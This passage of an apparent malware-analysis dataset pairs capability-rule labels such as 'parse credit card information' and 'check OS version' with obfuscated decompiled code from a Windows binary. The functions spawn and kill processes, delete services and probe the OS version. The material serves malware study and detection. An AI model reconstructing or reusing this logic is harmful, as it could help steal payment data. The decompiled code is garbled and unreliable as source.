0x11) = 0xac;\n            puVar15 = unaff_EDI;\n            if ((uVar5 != 0) && (uVar5 == 0)) {\n                out(0xc4, uVar9);\n                uVar10 = uVar10 & 0xffffff00 | param_2 ^ param_1;\n                puVar15 = unaff_EDI + 1;\n                *unaff_EDI = uVar9;\n            }\n            *(puVar15 + 0x12) = 0x42;\n            uStack30 = uStack20;\n            uStack32 = param_1 >> 0x10;\n            while( true ) {\n                bVar16 = -1 < uVar9 + -1;\n                uVar2 = uStack32;\n                uVar9 = uStack30;\n                *(puVar15 + 0x13) = 0x4f;\n                if ((bVar16) && (!bVar16)) {\n                    *(puVar15 + 7) = in_ST0;\n                    puVar15 = puVar15 + 5;\n                    in_ST0 = in_ST1;\n                    in_ST1 = in_ST2;\n                    in_ST2 = in_ST3;\n                    in_ST3 = in_ST4;\n                    in_ST4 = in_ST5;\n                    in_ST5 = in_ST6;\n                    in_ST6 = in_ST7;\n                }\n                *(puVar15 + 5) = 0x68;\n                uStack32 = param_3;\n                uStack30 = param_3 >> 0x10;\n                bVar16 = (POPCOUNT((uVar3 ^ 0x16 | uVar9 >> 8) - (uVar10 >> 8)) & 1U) == 0;\n                *(puVar15 + 0x15) = 0x4e;\n                if ((bVar16) || (!bVar16)) {\n                    *(puVar15 + 0x16) = 0x3f;\n                    uVar8 = uVar9;\n                }\n                else {\n                    uVar4 = uVar10 + 1;\n                    puVar12 = *0xc617b43a;\n                    puVar15 = puVar15 + 1;\n                    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                    uVar8 = uVar4 + in_AF * -6 & 0xffff000f;\n                    uVar10 = uVar9;\n                }\n                uVar4 = uVar10 ^ uVar3 | 0x67;\n                *(puVar15 + 0x17) = 0xf5;\n                if ((uVar4 < '\\x01') || ('\\0' < uVar4)) break;\n                in_AF = 9 < (uVar8 & 0xf) | in_AF;\n                uVar9 = uVar8 + in_AF * '\\x06' & 0xffff000f;\n                if ((param_1 & 0xffff | uVar2 << 0x10) != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n            }\n            **(puVar12 + 0xc) = 0x18;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 2308
    },
    "00401930": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401ab3) overlaps instruction at (ram,0x00401ab2)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nulong __fastcall fcn.00401930(uint32_t param_1, int32_t *param_2, int32_t param_3, int32_t param_4, uint param_5)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char unaff_00023900;\n    uchar *unaff_00023b00;\n    char cVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    uchar *in_EAX;\n    uint uVar6;\n    int16_t iVar7;\n    int32_t *piVar8;\n    uint *unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uchar *puVar12;\n    ushort in_SS;\n    bool bVar13;\n    bool in_PF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 in_ST0;\n    ulong uVar14;\n    ushort unaff_retaddr;\n    uchar *in_stack_5f9dff5f;\n    uint32_t uStack20;\n    \n    puVar11 = &stack0xfffffffc;\n    if ((!in_PF) && (puVar11 = &stack0xfffffffc,  in_PF)) {\n        iVar2 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar11 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar11 < 0) {\n            uVar1 = *(in_EAX + -0x18);\n            *(in_EAX + -0x18) = CONCAT14(&stack0xfffffffc < in_stack_5f9dff5f, uVar1) >> 8 | uVar1 << 0x19;\n            param_2 = param_2 + 2;\n            *param_2 = *param_2 + (unaff_EBX >> 8);\n            bVar13 = *param_2 == '\\0';\n            fcn.004024b0();\n            puVar10 = puVar11;\n            if ((!bVar13) && (bVar13)) {\n                puVar9 = &stack0xfffffff0;\n                puVar10 = &stack0xfffffff0;\n                cVar3 = '\\x10';\n                do {\n                    puVar11 = puVar11 + -1;\n                    puVar9 = puVar9 + -1;\n                    *puVar9 = *puVar11;\n                    cVar3 = cVar3 + -1;\n                } while ('\\0' < cVar3);\n            }\n            if (*0x4235d8 == 0) {\n                uStack20 = 0x401907;\n                (*_sym.imp.USER32.dll_PostQuitMessage)();\n                fcn.00403220();\n            }\n            uStack20 = puVar10[4];\n            uVar14 = (*_sym.imp.USER32.dll_DefWindowProcA)(puVar10[2], iVar2);\n            return uVar14;\n        }\n        if (-1 < iVar2) goto code_r0x004019a4;\n    }\n    in_EAX = puVar11[2];\n    *in_EAX = 0xd9;\n    piVar8 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - unaff_EBX, param_1);\n    bVar13 = piVar8 < param_2;\n    unaff_EDI = puVar11[2];\n    *(unaff_EDI + 1) = 0xbe;\n    if ((piVar8 < param_2) || (param_2 <= piVar8)) {\n        *(unaff_EDI + 2) = 0xd0;\n    }\n    else {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar4 = in_EAX + -1;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + in_AF * '\\x06';\n        uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | bVar13 | in_AF * (0xf9 < uVar4)) * '`';\n        in_EAX = in_EAX + -1 & 0xffffff00 | uVar4;\n        *param_2 = *param_2 + 0x47c6df84;\n        bVar13 = CARRY1(param_2, uVar4);\n        param_2 = param_2 & 0xffffff00 | param_2 + uVar4;\n    }\n    iVar7 = CONCAT31(param_1 >> 8, 9);\n    *(unaff_EDI + 3) = 9;\n    if ((bVar13) || (!bVar13)) {\n        *(unaff_EDI + 1) = 0xfe;\n        if ((!bVar13 && unaff_EBX != 0xffffffff) && (bVar13 || unaff_EBX == 0xffffffff)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(unaff_EDI + 5) = 0x70;\n        uVar5 = in_EAX + unaff_EBX | 0x11a9;\n        uVar4 = POPCOUNT(uVar5 & 0xff);\n        *(unaff_EDI + 6) = 0x94;\n        if ((uVar5 == 0) || (uVar5 != 0)) {\n            *(unaff_EDI + 7) = 0x6d;\n        }\n        else {\n            puVar10 = CONCAT22(iVar7, in_SS);\n            uVar4 = POPCOUNT(in_EAX & 0xc5);\n            unaff_EDI = puVar10 + 1;\n            uVar6 = in(param_2);\n            *puVar10 = uVar6;\n        }\n        bVar13 = (uVar4 & 1) != 0;\n        if ((bVar13) && (!bVar13)) {\n            puVar10 = &stack0xffffffec;\n            cVar3 = '\\x1e';\n            do {\n                puVar11 = puVar11 + -1;\n                puVar10 = puVar10 + -1;\n                *puVar10 = *puVar11;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n            uVar6 = in(0x78);\n            return CONCAT44(param_2, uVar6);\n        }\n        *(unaff_EDI + 2) = 9;\n        uVar5 = iVar7 - 1U & unaff_EDI | 0x61be;\n        bVar13 = uVar5 == 0;\n        *(unaff_EDI + 9) = 0xef;\n        if ((!bVar13) && (bVar13)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(unaff_EDI + 10) = 0x7d;\n        if ((!bVar13) && (bVar13)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(unaff_EDI + 0xb) = 0xc5;\n        if ((-1 < uVar5) && (-1 >= uVar5)) {\n            puVar12 = unaff_EDI | puVar11;\n            unaff_EDI = puVar12 + 1;\n            *puVar12 = in_EAX;\n        }\n        *(unaff_EDI + 3) = 8;\n        puVar11 = unaff_EBX[2];\n        *(puVar11 + 0xd) = 0x1e;\n        bVar13 = (POPCOUNT((unaff_ESI | 0x561b) - param_3 & 0xff) & 1U) == 0;\n        *(puVar11 + 0xe) = 0xae;\n        if ((bVar13) || (!bVar13)) {\n            *(puVar11 + 0xf) = 0x39;\n            uVar4 = param_3;\n            *(puVar11 + 4) = 0xd3;\n            if ((0x51 < uVar4) && (uVar4 < 0x52)) {\n                param_5._0_2_ = param_5 & 0xcc58;\n                param_5._2_2_ = param_5._2_2_ & 0xe2f4;\n            }\n            *(puVar11 + 0x11) = 0x85;\n            *(puVar11 + 0x12) = 0x5d;\n            uVar4 = uVar4 ^ unaff_retaddr >> 8 | 0x67;\n            *(puVar11 + 0x13) = 0xb8;\n            if ((uVar4 < '\\x01') || ('\\0' < uVar4)) {\n                *(puVar11 + 5) = 0xef;\n                *unaff_EBX[3] = 0x15;\n                return CONCAT44(param_3, CONCAT22(param_5._2_2_, param_5));\n            }\n            if (param_4 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar6 = in(param_3);\n            *puVar11 = uVar6;\n        }\n        else {\n            unaff_00023900 = '\\x1f';\n            unaff_00023b00 = &stack0x0000000c;\n            puVar11 = &stack0x0000000c;\n            cVar3 = '\\x1e';\n            do {\n                unaff_EBX = unaff_EBX + -1;\n                puVar11 = puVar11 + -1;\n                *puVar11 = *unaff_EBX;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n        }\n        *(&stack0x0000000c + (unaff_00023900 - 1) * -4) = unaff_00023b00;\n        uVar6 = in(0x78);\n        return CONCAT44(param_3, uVar6);\n    }\ncode_r0x004019a4:\n    uVar4 = in_EAX;\n    cVar3 = uVar4 - *unaff_EDI;\n    uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n               (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar3) & 1U) == 0) * 4 |\n               uVar4 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n               (in_AC & 1) * 0x40000;\n    func_0x10187926();\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 2647
    },
    "004024b0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040269f) overlaps instruction at (ram,0x0040269e)\n// \n// WARNING: Removing unreachable block (ram,0x00402592)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __fastcall fcn.004024b0(uint32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    char *extraout_ECX;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    uint32_t unaff_EBX;\n    uint32_t uVar5;\n    uchar *unaff_EBP;\n    uchar *puVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uchar *unaff_EDI;\n    uint *puVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    uchar uVar14;\n    float10 extraout_ST0;\n    float10 fVar15;\n    float10 extraout_ST0_00;\n    ulong uVar16;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    puVar7 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffffc;\n    uVar5 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - unaff_EBX, param_1);\n    bVar11 = uVar5 < param_2;\n    bVar13 = SBORROW4(uVar5, param_2);\n    bVar12 = uVar5 == param_2;\n    uVar16 = fcn.00403f80();\n    iVar2 = uVar16 >> 0x20;\n    if ((bVar13) || (!bVar13)) {\n        uVar16 = fcn.00401c90();\n        bVar12 = false;\n        bVar11 = uVar16 < 0;\n        if (uVar16 == 0) {\n            return;\n        }\n        fVar15 = extraout_ST0_00;\n        if (!bVar11) goto code_r0x00402509;\ncode_r0x0040251a:\n        uVar5 = 0;\n    }\n    else {\n        uVar14 = in(uVar16 >> 0x20);\n        *unaff_EDI = uVar14;\n        uVar5 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (!bVar11 && !bVar12) {\n            pcVar3 = extraout_ECX + -1;\n            extraout_ECX[0x3f] = extraout_ECX[0x3f] + (unaff_EBX >> 8);\n            goto code_r0x0040256c;\n        }\n        fVar15 = extraout_ST0 / *(uVar16 + -0x7f6a6a73);\n        cVar1 = *extraout_ECX;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(cVar1, 0xbc);\n        uVar16 = CONCAT44(iVar2, 0xfff793e8);\n        *0xfff793e8 = *0xfff793e8 + -0x86c18;\n        pcVar3 = (unaff_EBX - 0x79) + iVar2;\n        bVar12 = SCARRY1(*pcVar3, cVar1);\n        *pcVar3 = *pcVar3 + cVar1;\n        bVar11 = *pcVar3 < '\\0';\n        puVar6 = unaff_EBP;\ncode_r0x00402509:\n        uVar5 = unaff_EBX;\n        puVar7 = puVar6;\n        if (bVar12 == bVar11) goto code_r0x0040251a;\n    }\n    piVar4 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = fVar15;\n    *piVar4 = *piVar4 + -0x24cc207c;\n    puVar7[-0x260] = uVar5;\n    puVar10 = puVar7 + -0x25f;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n    if (iVar2 == 0) {\n        return;\n    }\n    if ((iVar2 < 0) || (iVar2 >= 0)) {\n        fcn.004050b0();\n    }\n    else {\n        pcVar3 = iVar2 + 0x2b49e82f;\n        *pcVar3 = *pcVar3 + pcVar3;\n    }\n    pcVar3 = 0x40;\n    puVar8 = puVar7;\ncode_r0x0040256c:\n    puVar8[-0x15c] = uVar5;\n    puVar10 = puVar8 + -0x15b;\n    for (; pcVar3 != NULL; pcVar3 = pcVar3 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    *(puVar8 + -0x14) = uVar5;\n    while( true ) {\n        puVar10 = puVar8 + -0x58;\n        for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *(puVar8 + -0x10) = 0;\n        *(puVar8 + -0x58) = 0x44;\n        *(puVar8 + -0xc) = 0;\n        *(puVar8 + -0x2c) = 1;\n        *(puVar8 + -8) = 0;\n        *(puVar8 + -0x28) = uVar5;\n        *(puVar8 + -4) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n        if (iVar2 == 0) {\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        (*_sym.imp.USER32.dll_EnumWindows)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n        uVar14 = SBORROW4(iVar2, 0x102);\n        if (iVar2 == 0x102) {\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n        }\n        puVar9 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if ((!uVar14) && (uVar14)) {\n            *puVar10 = *unaff_ESI;\n            puVar9 = unaff_ESI + 1;\n        }\n        (*puVar9)();\n        (*puVar9)();\n        iVar2 = *(puVar8 + -0x14);\n        *(puVar8 + -0x14) = iVar2 + 1;\n        if (0 < iVar2 + 1) break;\n        uVar5 = 0;\n        unaff_ESI = puVar9;\n    }\n    return;\n}\n",
        "token_count": 1748
    },
    "00404760": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404760(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 78
    },
    "00401680": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016de) overlaps instruction at (ram,0x004016dc)\n// \n\nvoid __cdecl fcn.00401680(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    fcn.004013e0(&var_68h, &var_4h);\n    if ((bVar3) || (arg_ch_00 = extraout_EDX,  !bVar3)) {\n        arg_ch_00 = var_4h;\n    }\n    fcn.00402a80(&var_68h, arg_ch_00, 0x407014, 0xa120);\n    *arg_8h = 0x407014;\n    *arg_ch = 0xa120;\n    return;\n}\n",
        "token_count": 331
    },
    "00403030": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040309e) overlaps instruction at (ram,0x0040309c)\n// \n\nint32_t __cdecl fcn.00403030(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char extraout_CL;\n    char cVar4;\n    char extraout_CL_00;\n    int32_t unaff_EBX;\n    char in_AF;\n    bool bVar5;\n    bool bVar6;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    bVar6 = iVar2 < 0;\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    if ((!bVar5) && (bVar5)) {\n        unaff_EBX = unaff_EBX + 1;\n        if (unaff_EBX == 0) {\n            return 0x5d5b5e5f;\n        }\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - unaff_EBX;\n        iVar2 = 1;\n        bVar6 = false;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    if ((bVar6) || (cVar4 = extraout_CL,  !bVar6)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        unaff_EBX = iVar2;\n        cVar4 = extraout_CL_00;\n    }\n    *(unaff_EBX + 0x5b5e5fc7) = *(unaff_EBX + 0x5b5e5fc7) + cVar4;\n    return iVar3 + 0x2c15ff57;\n}\n",
        "token_count": 430
    },
    "00401bf0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c27) overlaps instruction at (ram,0x00401c22)\n// \n\nulong fcn.00401bf0(void)\n\n{\n    char *pcVar1;\n    char extraout_CL;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    bool bVar3;\n    ulong uVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    uint var_8ch;\n    \n    bVar3 = (POPCOUNT(&lpVersionInformation & 0xff) & 1U) == 0;\n    lpVersionInformation = 0x94;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    iVar2 = uVar4 >> 0x20;\n    if (((bVar3) || (!bVar3)) && (var_90h == 5)) {\n        return CONCAT44(iVar2, 1);\n    }\n    pcVar1 = iVar2 + 0x1b80976;\n    *pcVar1 = *pcVar1 + pcVar1;\n    *(unaff_EBX + 0x50c35de5) = *(unaff_EBX + 0x50c35de5) + extraout_CL;\n    if ((*0xfffffee0 == 6) && (*0xfffffee4 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 319
    },
    "00401d70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401dcc) overlaps instruction at (ram,0x00401dcb)\n// \n\nbool __cdecl fcn.00401d70(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint16_t extraout_DX;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    bool bVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    bVar4 = (POPCOUNT(((uVar1 ^ 0x3d) + 0x7c28 ^ extraout_DX & 0xff) + 0xbfff & 0xff) & 1U) == 0;\n    var_14h = 0x423564;\n    var_10h = 0x42355c;\n    var_ch = 0x42356c;\n    var_8h = 0x423574;\n    var_4h = 0x42357c;\n    if ((bVar4) || (!bVar4)) {\n        unaff_EDI = 0;\n    }\n    *arg_8h = *arg_8h ^ 0xffffffff;\n    puVar3 = &var_14h;\n    do {\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar3);\n        if (iVar2 != 0) {\n            return true;\n        }\n        unaff_EDI = unaff_EDI + 1;\n        puVar3 = puVar3 + 1;\n    } while (unaff_EDI < 5);\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x423554);\n    return iVar2 == 0;\n}\n",
        "token_count": 441
    },
    "00403ba0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ed6) overlaps instruction at (ram,0x00403ed4)\n// \n\nvoid fcn.00403ba0(void)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    char extraout_CH;\n    uint8_t uVar6;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    char **extraout_ECX;\n    int32_t extraout_EDX;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar9;\n    bool bVar10;\n    bool in_ZF;\n    char in_SF;\n    uint8_t in_IF;\n    bool bVar11;\n    uint8_t in_OF;\n    bool bVar12;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar13;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    bVar11 = false;\n    if ((!in_ZF) && (in_ZF)) {\n        in_OF = ((in_OF & 1) * 0x800 & 0x800) != 0;\n        bVar11 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        in_SF = (in_SF * -0x80 | (in_ZF & 1U) * '@' & 0x80) != 0;\n    }\n    uStack16 = 0x11;\n    uStack20 = 0x423134;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    fcn.004051d0();\n    if ((!in_SF) && (in_SF)) {\n        in_OF = 0;\n    }\n    fcn.004051d0();\n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = *unaff_ESI;\n        unaff_ESI = unaff_ESI + bVar11 * -2 + 1;\n        unaff_EDI = unaff_EDI + bVar11 * -2 + 1;\n    }\n    fcn.004051d0(0x4235b4, 0xe);\n    bVar10 = false;\n    uStack16 = 0x4233b4;\n    uStack20 = 0xe;\n    uStack24 = 0x4235b4;\n    iStack28 = 0x403c46;\n    fcn.004051d0();\n    if ((bVar10) || (!bVar10)) {\n        iStack28 = 0xb;\n    }\n    puVar9 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    pcVar2 = unaff_EBP + 0x680b6a76;\n    *pcVar2 = *pcVar2 << 2;\n    *(extraout_EDX + 0xe) = *(extraout_EDX + 0xe) + extraout_CH;\n    uVar13 = fcn.004051d0();\n    piVar7 = uVar13 >> 0x20;\n    *(uVar13 + -0x7ce92414) = extraout_ST0;\n    *piVar7 = *piVar7 + 0x86adf84;\n    fcn.004051d0(0x4235b4, 0xe, 0x4233cc, pcVar2);\n    uStack16 = 9;\n    uStack20 = 0x4233d4;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    uVar4 = fcn.004051d0();\n    bVar10 = ((uVar4 & 0xff | ((uVar4 >> 8) - pcVar2) + 0x4d << 8) & 0x26ae) == 1;\n    uStack16 = 9;\n    uStack20 = 0x4233e0;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    uVar13 = fcn.004051d0();\n    iVar8 = uVar13 >> 0x20;\n    uVar6 = extraout_ECX >> 8;\n    if ((!bVar10) && (bVar10)) {\n        uVar5 = in(uVar13 >> 0x20);\n        *puVar9 = uVar5;\n        if (&stack0xffffffe4 < 1) {\n            pcVar3 = puVar9 + bVar11 * -8 + 0xfd286cd;\n            *pcVar3 = *pcVar3 + uVar13;\n            pcVar3 = *extraout_ECX;\n            *extraout_ECX = uVar13;\n            *pcVar3 = *pcVar3 + pcVar3;\n            pcVar3[0x6a] = pcVar3[0x6a] + pcVar2;\n            pcVar2 = iVar8 + 0xe;\n            *pcVar2 = *pcVar2 + (uVar6 | pcVar3[8]);\n            goto code_r0x00403d88;\n        }\n    }\n    puVar1 = iVar8 + 9;\n    *puVar1 = *puVar1 ^ uVar6;\n    fcn.004051d0();\n    fcn.004051d0(0x4235b4, 0xe, 0x4233f8);\n    uStack16 = 3;\n    uStack20 = 0x423404;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    fcn.004051d0();\n    iStack28 = 10;\ncode_r0x00403d88:\n    fcn.004051d0();\n    bVar11 = false;\n    uStack16 = 0x423414;\n    uStack20 = 0xe;\n    uStack24 = 0x4235b4;\n    iStack28 = 0x403dc9;\n    fcn.004051d0();\n    if ((bVar11) || (iStack28 = extraout_EDX_00,  !bVar11)) {\n        iStack28 = 0xc;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    puVar1 = extraout_EDX_00 + 0xe;\n    bVar11 = CARRY1(*puVar1, extraout_CH_00);\n    *puVar1 = *puVar1 + extraout_CH_00;\n    uVar5 = fcn.004051d0();\n    if ((!bVar11) && (bVar11)) {\n        out(0xbd, uVar5);\n        return;\n    }\n    fcn.004051d0(0x4235b4, 0xe, 0x423460, 0xb);\n    uStack16 = 4;\n    uStack20 = 0x42346c;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    fcn.004051d0();\n    uStack16 = 4;\n    uStack20 = 0x423470;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    fcn.004051d0();\n    uStack16 = 0xc;\n    uStack20 = 0x423474;\n    uStack24 = 0xe;\n    iStack28 = 0x4235b4;\n    uVar13 = fcn.004051d0();\n    piVar7 = uVar13 >> 0x20;\n    *(uVar13 + -0x7ce92414) = extraout_ST0_00;\n    *piVar7 = *piVar7 + 0x46adf84;\n    while( true ) {\n        fcn.004051d0(0x4235b4);\n        bVar11 = false;\n        bVar12 = false;\n        bVar10 = (extraout_CH_01 | 0x47) == 0;\n        uStack20 = 9;\n        uStack24 = 0x423484;\n        iStack28 = 0xe;\n        fcn.004051d0();\n        if ((bVar11 || bVar10) || (!bVar11 && !bVar10)) break;\n        if (!bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(extraout_EDX_01 + 0xe) = *(extraout_EDX_01 + 0xe) + extraout_CH_02;\n    }\n    fcn.004051d0(0x4235b4);\n    uStack20 = 7;\n    uStack24 = 0x4234a8;\n    iStack28 = 0xe;\n    fcn.004051d0();\n    return;\n}\n",
        "token_count": 2105
    },
    "004045e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404705) overlaps instruction at (ram,0x00404704)\n// \n\nuint __cdecl fcn.004045e0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar **ppuVar5;\n    uchar **ppuVar6;\n    uint *puVar7;\n    char *pcVar8;\n    uint *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    bool bVar12;\n    uchar *apuStack636 [2];\n    uint var_263h;\n    uchar var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    puVar10 = &stack0xfffffffc;\n    puVar7 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_160h = 0;\n    puVar7 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) 